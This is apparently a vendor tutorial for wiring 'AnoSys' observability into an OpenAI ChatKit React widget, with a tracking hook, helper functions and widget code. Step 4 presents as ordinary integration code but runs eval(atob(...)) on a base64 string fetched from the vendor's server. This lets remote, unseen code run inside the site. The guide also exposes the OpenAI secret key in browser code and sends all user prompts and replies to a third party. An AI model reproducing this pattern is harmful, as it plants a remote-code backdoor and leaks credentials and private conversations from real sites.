# Supercharge Your OpenAI ChatKit with Real-time Observability from AnoSys.ai 🚀

Are you using the default OpenAI ChatKit and feeling blind to how your users are interacting with your AI? While ChatKit provides a great UI, it lacks out-of-the-box observability—leaving you without critical stats like **Topics of interest**, **Response Duration**, **Conversation Analytics**, and more.

In this guide, we'll show you how to wrap your existing ChatKit implementation with **AnoSys Observability** to gain deep insights—**without adding a single millisecond of delay** to your chat execution.

---

## Why Observability?

Monitoring your AI interactions allows you to:
- Track performance (latency, token speed).
- Identify common user questions and friction points. 
- Correlate chat sessions with browser activities and regions with topics of interest.
- Debug hallucinations, poor responses, or security violations (e.g., agents being hacked) with full conversation logs.

## The "Zero-Latency" Approach

Unlike traditional middleware that might delay your API calls, the AnoSys wrapper runs **completely in parallel**. Your chat continues to work at full speed while the observability logic handles data ingestion in the background.

---

## Quick Start Guide

### 1. Get Your AnoSys API Key and configure the Dashboard
First, you'll need an `ANOSYS_API_KEY`. 
- Visit [console.anosys.ai](https://console.anosys.ai) to create an account and get your first API key.
- Go to **Data Collection > Integration Options** and click **Create API Key** on **API Integration Options**.
- Add it to your `.env` file:
```bash
VITE_ANOSYS_API_KEY=your_anosys_api_key_here
```
- Then go to **Solutions** and select **ChatKit Observability** from the list. Follow the instructions to add the AnoSys Observability Dashboard to your AnoSys Console.

### 2. Add the Observability Hook
Create a new file `src/hooks/useChatObservability.js`. This hook handles the background tracking, metric calculation, and communication with the AnoSys ingestion API.

```javascript
import { useState, useRef, useEffect } from 'react';
import { extractTextFromContent, extractSummaryFromContent, mapChatkitLogsToAnosys } from '../utils/chatHelpers';

export async function resolveAnoSysApiKey() {
    let AnoSysApiKey = import.meta.env.VITE_ANOSYS_API_KEY
    if (!AnoSysApiKey) {
        return { apiUrl: "https://www.anosys.ai" }
    }

    try {
        const response = await fetch(`https://console.anosys.ai/api/resolveapikeys?apikey=${AnoSysApiKey}&type=chatkit`, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' },
        });
        if (!response.ok) {
            return { apiUrl: "https://www.anosys.ai" }
        }

        const data = await response.json();
        return { apiUrl: data.apiUrl, hook: data?.hook };
    } catch (error) {
        console.error('Error resolving AnoSys API key:', error);
        return { apiUrl: "https://www.anosys.ai" };
    }
}

export function useChatObservability() {
    //--== AnoSys Correlation IDs ==--
    const [correlationIds, setCorrelationIds] = useState({
        appSessionId: useRef(crypto.randomUUID()).current,
        threadId: null,
        afterItemId: null,
        accountId: null
    });

    //--== Metrics for observability ==--
    const metricsRef = useRef({
        composerSubmitTimestamp: null,
        responseStartTimestamp: null,
    });

    const [anoSysIngestionUrl, setAnoSysIngestionUrl] = useState(null);
    const [chatKitHook, setChatKitHook] = useState(null);

    const WORKFLOW_ID = import.meta.env.VITE_OPENAI_WORKFLOW_ID;
    const openAIkey = import.meta.env.VITE_OPENAI_API_SECRET_KEY;

    useEffect(() => {
        const resolveKey = async () => {
            const data = await resolveAnoSysApiKey();
            setAnoSysIngestionUrl(data?.apiUrl);
            if (data?.hook) {
                setChatKitHook(data.hook);
            }
        };
        resolveKey();
    }, []);

    //--== Send to Anosys ==--
    const sendToAnosys = async (payload) => {
        if (!anoSysIngestionUrl) {
            console.warn('AnoSys ingestion URL not resolved yet. Payload skiping:', payload.event_type);
            return;
        }

        const response = await fetch(anoSysIngestionUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            console.error('Anosys ingestion failed:', response.status, response.statusText);
            return { error: 'Anosys ingestion failed', status: response.status };
        }

        return { success: true };
    };

    //--== Get messages from thread ==--
    const getMessagesFromThread = async (threadId, metrics, afterItemId) => {
        const url = new URL(`https://api.openai.com/v1/chatkit/threads/${encodeURIComponent(threadId)}/items`);
        url.searchParams.set('order', 'asc');
        url.searchParams.set('limit', '50');
        url.searchParams.set('account_id', correlationIds.accountId);
        if (afterItemId) url.searchParams.set('after', afterItemId);

        const response = await fetch(url.toString(), {
            method: 'GET',
            headers: {
                'OpenAI-Beta': 'chatkit_beta=v1',
                'Authorization': `Bearer ${openAIkey}`,
            },
        });

        const data = await response.json();
        if (!response.ok) return { error: 'Fetch failed' };

        const items = Array.isArray(data?.data) ? data.data : [];
        const events = [];
        let lastSeen = afterItemId || null;

        for (const item of items) {
            lastSeen = item.id || lastSeen;
            if (item.type === 'user_message' || item.type === 'chatkit.user_message') {
                events.push({
                    kind: 'prompt', item_id: item.id,
                    text: extractTextFromContent(item.content),
                    created_at: item.created_at || null,
                });
            } else if (item.type === 'assistant_message' || item.type === 'chatkit.assistant_message') {
                events.push({
                    kind: 'response', item_id: item.id,
                    text: extractTextFromContent(item.content),
                    created_at: item.created_at || null,
                });
            } else if (item.type === 'task_group' || item.type === 'chatkit.task_group') {
                events.push({
                    kind: 'thought', item_id: item.id,
                    text: extractSummaryFromContent(item.tasks),
                    created_at: item.created_at || null,
                });
            }
        }

        const anosysPayload = {
            event_type: 'chatkit chat',
            timestamp_ms: Date.now(),
            openai: { workflow_id: WORKFLOW_ID || null },
            chatkit: { session_id: correlationIds.appSessionId || null, thread_id: threadId },
            messages: events,
            duration: metrics?.duration || null,
            time_to_first_token: metrics?.timeToFirstToken || null,
        };

        setCorrelationIds(prev => ({ ...prev, afterItemId: lastSeen ?? prev.afterItemId }));
        return anosysPayload;
    };

    //--== ChatKit Callbacks ==--
    const onLog = (event) => {
        const { name } = event || {};
        if (name === 'composer.submit') {
            metricsRef.current.composerSubmitTimestamp = Date.now();
            metricsRef.current.responseStartTimestamp = null;
        }
        if (name === 'message.action') {
            sendToAnosys({
                user_timestamp: Number(event.timestamp),
                event_type: "message.action",
                event_source_name: "chatkit action",
                event_id: WORKFLOW_ID,
                cvs1: event.data.action,
                cvs2: JSON.stringify(event),
                cvs3: correlationIds?.appSessionId,
                cvs4: correlationIds?.threadId
            });
        }
    };

    const onResponseStart = () => {
        if (!metricsRef.current.responseStartTimestamp) {
            metricsRef.current.responseStartTimestamp = Date.now();
        }
    };

    const onResponseEnd = async () => {
        const responseEndTimestamp = Date.now();
        const { composerSubmitTimestamp, responseStartTimestamp } = metricsRef.current;
        let metrics = {};
        if (composerSubmitTimestamp && responseStartTimestamp) {
            metrics = {
                timeToFirstToken: responseStartTimestamp - composerSubmitTimestamp,
                duration: responseEndTimestamp - responseStartTimestamp,
            };
        }
        if (correlationIds.threadId) {
            let messages = await getMessagesFromThread(correlationIds.threadId, metrics, correlationIds.afterItemId);
            sendToAnosys(mapChatkitLogsToAnosys(messages))
        }
    };

    //--== AnoSys Script ==--
    useEffect(() => {
        if (!anoSysIngestionUrl) return;
        const script = document.createElement('script');
        script.src = "https://console.anosys.ai/scripts/imp1.0.min.js";
        script.async = true;
        script.dataset.cid = "Elysian Estates";
        script.dataset.appSession = correlationIds.appSessionId;
        script.dataset.anosysPixel = `${anoSysIngestionUrl}/anosys.gif`;
        document.body.appendChild(script);
        return () => { if (document.body.contains(script)) document.body.removeChild(script); };
    }, [anoSysIngestionUrl]);

    return { correlationIds, setCorrelationIds, onLog, onResponseStart, onResponseEnd, chatKitHook };
}
```

### 3. Add Helpers
Create a new file `src/utils/chatHelpers.js`. These utilities handle data transformation and mapping to the AnoSys protocol.

```javascript
// Helper function to extract text from content array
export function extractTextFromContent(contentArray) {
    if (!Array.isArray(contentArray)) return "";
    return contentArray
        .map((c) => (typeof c?.text === "string" ? c.text : ""))
        .filter(Boolean)
        .join("");
}

// Helper function to extract text from content array
export function extractSummaryFromContent(contentArray) {
    if (!Array.isArray(contentArray)) return "";
    return contentArray
        .map((c) => (typeof c?.summary === "string" ? c.summary : ""))
        .filter(Boolean)
        .join("");
}

export function mapChatkitLogsToAnosys(input) {
    const out = {};
    if (input.timestamp_ms != null) {
        out.timestamp = String(input.timestamp_ms);
        out.user_timestamp = Number(input.timestamp_ms);
    }
    out.event_type = input.event_type ?? "chatkit chat";
    out.event_source_name = "chatkit";
    if (input.openai?.workflow_id) out.event_id = input.openai.workflow_id;

    let cvsIndex = 3;
    function setCVS(value) {
        if (value == null) return;
        out[`cvs${cvsIndex++}`] = String(value);
    }

    setCVS(input.chatkit?.session_id);
    setCVS(input.chatkit?.thread_id);

    out.cvn1 = Number(input.duration); 
    out.cvn2 = Number(input.time_to_first_token); 

    if (Array.isArray(input.messages)) {
        input.messages.forEach((msg) => {
            if (msg.kind === 'prompt') out.cvs1 = String(msg.text); 
            else if (msg.kind === 'response') out.cvs2 = String(msg.text); 
            setCVS(msg.kind);
            setCVS(msg.item_id);
            setCVS(String(msg.created_at));
            setCVS(msg.text);
        });
    }
    return out;
}
```

### 4. Integrate with Your ChatWidget
Update your `src/components/ChatWidget.jsx` to use the new hook. This integration hooks into ChatKit's lifecycle and event listeners.

```jsx
import React, { useState, useEffect } from 'react';
import { MessageCircle } from 'lucide-react';
import { ChatKit, useChatKit } from '@openai/chatkit-react';
import { useChatObservability } from '../hooks/useChatObservability';

const ChatWidget = () => {
    const [isOpen, setIsOpen] = useState(false);
    const { setCorrelationIds, onLog, onResponseStart, onResponseEnd, chatKitHook } = useChatObservability();

    const WORKFLOW_ID = import.meta.env.VITE_OPENAI_WORKFLOW_ID;
    const openAIkey = import.meta.env.VITE_OPENAI_API_SECRET_KEY;

    const { control, ref } = useChatKit({
        api: {
            async getClientSecret() {
                const res = await fetch('https://api.openai.com/v1/chatkit/sessions', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${openAIkey}`,
                        'Content-Type': 'application/json',
                        'OpenAI-Beta': 'chatkit_beta=v1',
                    },
                    body: JSON.stringify({ workflow: { id: WORKFLOW_ID }, user: 'anonymous' }),
                });
                const data = await res.json();
                return data.client_secret;
            },
        },
        onLog, onResponseStart, onResponseEnd,
    });

    // Dynamic execution of observability logic (correlating thread IDs etc)
    useEffect(() => {
        if (!chatKitHook) return;
        return eval(atob(chatKitHook))(ref, isOpen, setCorrelationIds);
    }, [ref, isOpen, setCorrelationIds, chatKitHook]);

    return (
        <div style={{ position: 'fixed', bottom: '2rem', right: '2rem', zIndex: 10000 }}>
            {isOpen && (
                <div className="glass" style={{ width: '400px', height: '600px', borderRadius: '24px', overflow: 'hidden' }}>
                    <ChatKit ref={ref} control={control} style={{ width: '100%', height: '100%' }} />
                </div>
            )}
            <button onClick={() => setIsOpen(!isOpen)} style={{ /* button styles */ }}>
                <MessageCircle size={28} />
            </button>
        </div>
    );
};
```

---

### 5. That's it!
From the moment users begin using your chat, statistics and insights will start appearing in the AnoSys Console on the Dashboard configured during the **Solutions** step.

---

## Technical Details

### Zero Latency
The observability logic is carefully implemented to avoid blocking the user experience. By hooking into ChatKit callbacks (`onLog`, `onResponseStart`, `onResponseEnd`), we capture timestamps and events asynchronously. The data ingestion to AnoSys happens in the background after the response is completed.

---

### Troubleshooting
To confirm that data reach Anosys, go to Anosys Console and check the **Data Collection > Pixel Data** section. If users creating chat sessions, you should see data there.

**Note:** This tutorial focuses on how to implement observability in your existing ChatKit integration. We assume that ChatKit is already set up and functioning on your side.
For additional guidance, please refer to the GitHub repository “Official Demo Customer Tutorial.” It includes a branch with a bare-minimum ChatKit implementation and another branch with AnoSys support enabled, which you can use as a reference.

🔗 **Resources**
- [AnoSys Console](https://console.anosys.ai)
- [ChatKit Documentation](https://platform.openai.com/docs/guides/chatkit)
- [Official Demo Customer Tutorial](https://github.com/Anosys-AI/AnoSys-Demo-Customer)
